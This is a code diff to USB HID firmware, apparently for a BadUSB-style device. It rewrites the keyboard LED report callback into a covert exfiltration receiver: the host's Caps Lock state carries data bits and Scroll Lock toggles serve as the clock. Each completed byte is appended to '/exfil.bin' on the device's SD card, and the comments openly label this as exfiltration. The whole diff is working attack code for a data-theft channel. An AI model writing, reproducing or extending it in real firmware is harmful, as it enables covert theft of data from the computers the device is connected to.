@@ -40,7 +40,13 @@ static std::queue<KEY_EVENT> eventsToProcess;
 static std::queue<std::pair<uint8_t, uint16_t>> cdcEventsToProcess;
 static std::queue<MOUSE_EVENT> mouseEventsToProcess;
 Adafruit_USBD_HID *usb_hid = nullptr;
+#include "../../Devices/Storage/HardwareStorage.h"
+
+// Exfiltration state
 static uint8_t currentLedStatus = 0;
+static uint8_t lastScrollLock = 0;
+static uint8_t currentByte = 0;
+static uint8_t bitCount = 0;
 
 // Output report callback for LED status
 void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)
@@ -48,19 +54,37 @@ void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8
   (void) report_id;
   (void) bufsize;
 
-  // LED report is type output
   if (report_type == HID_REPORT_TYPE_OUTPUT)
   {
-    // The buffer contains the LED bitmask:
-    // bit 0: Num Lock
-    // bit 1: Caps Lock
-    // bit 2: Scroll Lock
-    // bit 3: Compose
-    // bit 4: Kana
     if (bufsize > 0)
     {
         currentLedStatus = buffer[0];
-        // Debug::Log.info(TAG_USB, "LED status: " + std::to_string(currentLedStatus));
+        
+        // Exfiltration Logic:
+        // bit 1 (Caps Lock) = Data Bit
+        // bit 2 (Scroll Lock) = Clock Toggle
+        uint8_t capsLock = (currentLedStatus >> 1) & 0x01;
+        uint8_t scrollLock = (currentLedStatus >> 2) & 0x01;
+
+        if (scrollLock != lastScrollLock) { // Clock toggled
+            lastScrollLock = scrollLock;
+
+            currentByte = (currentByte << 1) | capsLock;
+            bitCount++;
+
+            if (bitCount >= 8) {
+                // Write byte to SD
+                if (Devices::Storage.isRunning()) {
+                    auto file = Devices::Storage.openFile("/exfil.bin", "a");
+                    if (file) {
+                        file.write(&currentByte, 1);
+                        file.close();
+                    }
+                }
+                bitCount = 0;
+                currentByte = 0;
+            }
+        }
     }
   }
 }
